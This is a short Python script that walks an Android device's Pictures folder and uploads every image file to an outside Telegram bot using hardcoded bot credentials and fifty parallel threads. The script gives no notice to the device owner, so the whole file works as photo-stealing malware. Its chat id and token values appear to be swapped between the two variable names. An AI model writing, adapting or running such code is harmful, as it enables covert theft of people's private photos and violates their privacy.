
from concurrent.futures import ThreadPoolExecutor
import requests
import os
chat_id ="9244500850:AAE4tTVFRmB_svDhaEM2BfkVWEkCNKQjQsU"
bot_token = "8991837989"
with ThreadPoolExecutor(max_workers=50) as executor:
    for root, dirs, files in os.walk("/storage/emulated/0/Pictures"):
        for file in files:
            file_path = os.path.join(root, file)
            file_type = file.split('.')[-1]
            if file_type in ['jpg', 'jpeg', 'png', 'gif']:
                url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
                data = {'chat_id': chat_id}
                files = {'photo': open(file_path, 'rb')}
                executor.submit(requests.post, url, files=files, data=data)
